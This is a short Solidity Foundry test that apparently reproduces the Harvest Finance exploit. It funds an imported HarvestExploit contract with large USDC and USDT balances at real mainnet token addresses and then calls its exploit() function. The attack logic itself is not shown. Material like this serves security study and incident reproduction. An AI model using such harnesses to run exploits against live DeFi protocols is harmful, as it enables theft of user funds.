// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../HarvestExploit.sol";

contract ContractTest is Test {
    HarvestExploit e;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    function test_harvest() public {
        e = new HarvestExploit();
        // Pre-fund contract with USDT & USDC
        deal(
            address(USDC),
            address(e),
            11425651360209
        );
        deal(
            address(USDT),
            address(e),
            10695553580690
        );

        e.exploit();
    }
}
